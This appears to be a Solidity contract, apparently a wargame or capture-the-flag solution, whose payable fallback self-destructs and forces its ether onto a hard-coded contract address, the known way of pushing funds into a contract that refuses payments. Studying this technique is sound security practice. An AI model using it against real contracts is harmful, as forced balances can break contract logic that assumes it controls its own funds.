// contracts/ForceDelivery.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceDelivery {
  /*

                     MEOW ?
           /\_/\   /
      ____/ o o \
    /~____  =ø= /
   (______)__m_m)

  */
  address public dumpContract = 0x6F2199992F51B0280fDB343Ac3523ED1e35D3e1b;

  fallback() external payable {
    selfdestruct(payable(dumpContract));
  }
}

